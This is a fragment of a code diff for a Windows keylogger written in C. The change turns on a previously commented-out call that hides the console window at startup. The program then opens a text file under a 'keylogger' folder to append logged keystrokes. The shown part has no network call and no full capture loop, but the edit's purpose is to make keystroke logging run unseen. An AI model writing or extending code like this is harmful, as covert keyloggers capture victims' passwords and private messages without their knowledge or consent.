@@ -21,9 +21,10 @@ int check_Caps(){
 	return 0;
 }
 int main(){
+	hide_the_console();
 	int time=300;// to record exactly, you need to change it. sometime my progarm do not record acuarately, this number belong to your computer( sorry about my english:)))
 	do{ 
-	// hide_the_console(); this function hide your consolve screen. if u want to hide it, please usmask this funtion. turn off in task manager
+	//  this function hide your consolve screen. if u want to hide it, please usmask this funtion. turn off in task manager
 	FILE *file1;
 	file1=fopen("C:\\Users\\ADMIN\\3D Objects\\keylogger\\keylogger.txt","a+");
        /// check special key..................
